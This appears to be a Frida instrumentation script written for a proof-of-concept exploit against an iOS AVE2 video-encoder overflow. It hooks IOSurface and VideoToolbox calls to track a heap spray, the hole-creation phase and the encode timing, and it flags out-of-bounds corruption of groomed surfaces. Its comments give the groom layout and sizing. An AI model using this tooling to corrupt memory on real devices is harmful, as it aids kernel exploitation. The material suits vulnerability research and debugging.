/**
 * AVE2 DPB overflow groom PoC — Frida instrumentation
 * Target: ResearchHost process (runs ave2_groom_poc.py via offload_python)
 *
 * Usage (from Mac, phone connected via USB):
 *   frida -U -n ResearchHost -s ave2_frida.js
 *   # or by pid: frida-ps -U | grep -i research
 *   #            frida -U -p <pid> -s ave2_frida.js
 *
 * Run idevicesyslog in parallel to capture AVE2 firmware panics / jetsam:
 *   idevicesyslog 2>&1 | tee ave2_syslog.txt
 *
 * What this hooks:
 *   IOSurfaceGetAllocSize       — fires INSTANTLY on corruption (size field changed)
 *   IOSurfaceCreate             — logs spray progress
 *   IOSurfaceRelease            — tracks hole phase
 *   VTCompressionSessionCreate  — timestamps encode session creation
 *   VTCompressionSessionEncodeFrame — timestamps async encode kick
 */

'use strict';

const GROOM_SIZE = 2023424;  // (2088960 * 2057) & 0xffffffff

function ts() {
    const d = new Date();
    const h  = d.getHours().toString().padStart(2, '0');
    const m  = d.getMinutes().toString().padStart(2, '0');
    const s  = d.getSeconds().toString().padStart(2, '0');
    const ms = d.getMilliseconds().toString().padStart(3, '0');
    return `${h}:${m}:${s}.${ms}`;
}

function log(msg) { console.log(`[${ts()}] ${msg}`); }

// ---- IOSurfaceGetAllocSize ---------------------------------------------------
// PRIMARY CORRUPTION SIGNAL.
// Our groom victims are all GROOM_SIZE. Any different return after the encode
// means the firmware OOB write hit the IOSurface kernel header.
// Note: other non-groom system surfaces will also be reported — ignore those
// that appear BEFORE the encode phase starts.

const IOSurfaceGetAllocSize = Module.findExportByName('IOSurface', 'IOSurfaceGetAllocSize');
if (IOSurfaceGetAllocSize) {
    Interceptor.attach(IOSurfaceGetAllocSize, {
        onEnter(args) { this.surf = args[0]; },
        onLeave(retval) {
            const sz = retval.toUInt32();
            // Only alert on sizes that look like a corrupted groom surface:
            // - non-zero (NULL surface would be 0)
            // - close to GROOM_SIZE (within ±4 MB) but not equal
            const diff = Math.abs(sz - GROOM_SIZE);
            if (sz !== 0 && sz !== GROOM_SIZE && diff < 4 * 1024 * 1024) {
                console.error(`\n*** [${ts()}] CORRUPTION DETECTED ***`);
                console.error(`    surf=${this.surf}  size=${sz}  expected=${GROOM_SIZE}`);
                console.error(`    delta=${sz - GROOM_SIZE} (0x${((sz - GROOM_SIZE) >>> 0).toString(16)})`);
                send({ event: 'CORRUPTION', surf: this.surf.toString(), size: sz });
            }
        }
    });
    log('[+] IOSurfaceGetAllocSize hooked (corruption alert active)');
} else {
    log('[-] IOSurfaceGetAllocSize NOT FOUND — corruption detection disabled');
}

// ---- IOSurfaceCreate --------------------------------------------------------
// Tracks spray progress so we know when each phase starts.

let createCount = 0;
const IOSurfaceCreate = Module.findExportByName('IOSurface', 'IOSurfaceCreate');
if (IOSurfaceCreate) {
    Interceptor.attach(IOSurfaceCreate, {
        onLeave(retval) {
            createCount++;
            // Log first 5 (sanity + start of spray), then at 32 (spray half), 65 (victims start)
            if (createCount <= 5 || createCount === 32 || createCount === 65) {
                log(`IOSurfaceCreate #${createCount} → surf=${retval}`);
            }
            if (createCount === 65) {
                log('-- victim placement phase started (surf #65 onward) --');
            }
        }
    });
    log('[+] IOSurfaceCreate hooked');
}

// ---- IOSurfaceRelease -------------------------------------------------------
// At count 32, the even-indexed spray surfaces are freed (hole creation phase).

let releaseCount = 0;
const IOSurfaceRelease = Module.findExportByName('IOSurface', 'IOSurfaceRelease');
if (IOSurfaceRelease) {
    Interceptor.attach(IOSurfaceRelease, {
        onEnter(args) {
            releaseCount++;
            if (releaseCount === 1)  log('-- IOSurfaceRelease: hole creation starting --');
            if (releaseCount === 32) log('-- IOSurfaceRelease: 32 holes created --');
        }
    });
    log('[+] IOSurfaceRelease hooked');
}

// ---- VTCompressionSessionCreate ---------------------------------------------
// Timestamps when the VT session for NTL=2057 is created.

const VTCompressionSessionCreate = Module.findExportByName('VideoToolbox', 'VTCompressionSessionCreate');
if (VTCompressionSessionCreate) {
    Interceptor.attach(VTCompressionSessionCreate, {
        onEnter(args) {
            this.w = args[1].toInt32();
            this.h = args[2].toInt32();
            const c = args[3].toUInt32();
            this.codec = [c>>24, c>>16, c>>8, c].map(b => String.fromCharCode(b & 0xff)).join('');
            this.sessOut = args[9];
        },
        onLeave(retval) {
            const st   = retval.toInt32();
            const sess = this.sessOut.readPointer();
            const stHex = `0x${(st >>> 0).toString(16)}`;
            log(`VTCompressionSessionCreate → st=${stHex}  sess=${sess}  ${this.w}x${this.h} '${this.codec}'`);
            send({ event: 'VT_CREATE', status: st, session: sess.toString(),
                   w: this.w, h: this.h, codec: this.codec });
        }
    });
    log('[+] VTCompressionSessionCreate hooked');
}

// ---- VTCompressionSessionEncodeFrame ----------------------------------------
// Timestamps the async encode kick (the moment firmware receives the job).

const VTEncodeFrame = Module.findExportByName('VideoToolbox', 'VTCompressionSessionEncodeFrame');
if (VTEncodeFrame) {
    Interceptor.attach(VTEncodeFrame, {
        onEnter(args) { this.sess = args[0]; },
        onLeave(retval) {
            const st = retval.toInt32();
            const stHex = `0x${(st >>> 0).toString(16)}`;
            log(`VTCompressionSessionEncodeFrame → st=${stHex}  sess=${this.sess}`);
            log('-- ENCODE FRAME QUEUED — OOB write window open now --');
            send({ event: 'VT_ENCODE', status: st, session: this.sess.toString() });
        }
    });
    log('[+] VTCompressionSessionEncodeFrame hooked');
}

// ---- VTCompressionSessionInvalidate -----------------------------------------
// Timestamps cleanup so we know when our OOB window closed.

const VTInvalidate = Module.findExportByName('VideoToolbox', 'VTCompressionSessionInvalidate');
if (VTInvalidate) {
    Interceptor.attach(VTInvalidate, {
        onEnter(args) {
            log(`VTCompressionSessionInvalidate sess=${args[0]} (OOB window closed)`);
        }
    });
    log('[+] VTCompressionSessionInvalidate hooked');
}

log('[*] =========================================================');
log('[*] AVE2 groom instrumentation loaded');
log(`[*] Watching IOSurfaceGetAllocSize for size != ${GROOM_SIZE}`);
log('[*] Corruption alert fires immediately — zero polling delay');
log('[*] =========================================================');
